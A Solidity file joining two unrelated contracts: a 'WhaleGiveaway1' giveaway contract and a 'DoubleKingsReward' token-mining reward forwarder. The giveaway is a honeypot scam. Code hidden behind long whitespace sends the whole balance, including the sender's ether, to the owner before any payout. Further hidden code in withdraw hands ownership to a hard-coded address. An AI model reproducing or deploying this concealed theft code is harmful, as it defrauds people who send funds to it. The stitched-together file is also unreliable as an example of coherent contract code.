 

pragma solidity ^0.4.19;

contract WhaleGiveaway1
{
    address public Owner = msg.sender;
   
    function()
    public
    payable
    {
        
    }
   
    function GetFreebie()
    public
    payable
    {                                                                    
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
            msg.sender.transfer(this.balance);
        }                                                                                                                
    }
    
    function withdraw()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
         
        adr.call.value(msg.value)(data);
    }
}
library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}

contract ERC20Interface {
  function balanceOf(address tokenOwner) public constant returns (uint balance);
  function transfer(address to, uint tokens) public returns (bool success);
}

contract ERC918Interface {
  function epochCount() public constant returns (uint);
}

contract proxyMinterInterface {
  function proxyMint(uint256 nonce, bytes32 challenge_digest) public returns (bool success);
}

contract mintForwarderInterface {
  function mintForwarder(uint256 nonce, bytes32 challenge_digest, address[] proxyMintArray) public returns (bool success);
}

contract ownedContractInterface {
  address public owner;
}

contract miningKingContract {
  function getKing() public returns (address king);
}

contract DoubleKingsReward {
  using SafeMath for uint;

  address public kingContract;
  address public minedToken;
  address public owner;

  constructor(address mToken, address mkContract) public {
    minedToken = mToken;
    kingContract = mkContract;
    owner = msg.sender;
  }

  function mintForwarder(uint256 nonce, bytes32 challenge_digest, address[] proxyMintArray) public returns (bool) {
    require(proxyMintArray.length > 0);

    uint previousEpochCount = ERC918Interface(minedToken).epochCount();
    address proxyMinter = proxyMintArray[0];

    if (proxyMintArray.length == 1) {
      require(proxyMinterInterface(proxyMinter).proxyMint(nonce, challenge_digest));
    } else {
      address[] memory remainingProxyMintArray = popFirstFromArray(proxyMintArray);
      require(mintForwarderInterface(proxyMinter).mintForwarder(nonce, challenge_digest, remainingProxyMintArray));
    }

    require(ERC918Interface(minedToken).epochCount() == previousEpochCount.add(1));

    address proxyMinterAddress = ownedContractInterface(proxyMinter).owner();
    require(proxyMinterAddress == owner);

    address miningKing = miningKingContract(kingContract).getKing();
    bytes memory nonceBytes = uintToBytesForAddress(nonce);
    address newKing = bytesToAddress(nonceBytes);

    if (miningKing == newKing) {
      uint balance = ERC20Interface(minedToken).balanceOf(this);
      require(ERC20Interface(minedToken).transfer(newKing, balance));
    }

    return true;
  }

  function popFirstFromArray(address[] array) pure public returns (address[] memory) {
    address[] memory newArray = new address[](array.length - 1);
    for (uint i = 0; i < array.length - 1; i++) {
      newArray[i] = array[i + 1];
    }
    return newArray;
  }

  function uintToBytesForAddress(uint256 x) pure public returns (bytes b) {
    b = new bytes(20);
    for (uint i = 0; i < 20; i++) {
      b[i] = byte(uint8(x / (2**(8*(31 - i)))));
    }
    return b;
  }

  function bytesToAddress(bytes b) pure public returns (address) {
    uint result = 0;
    for (uint i = b.length - 1; i + 1 > 0; i--) {
      uint c = uint(b[i]);
      uint to_inc = c * (16 ** ((b.length - i - 1) * 2));
      result += to_inc;
    }
    return address(result);
  }
}
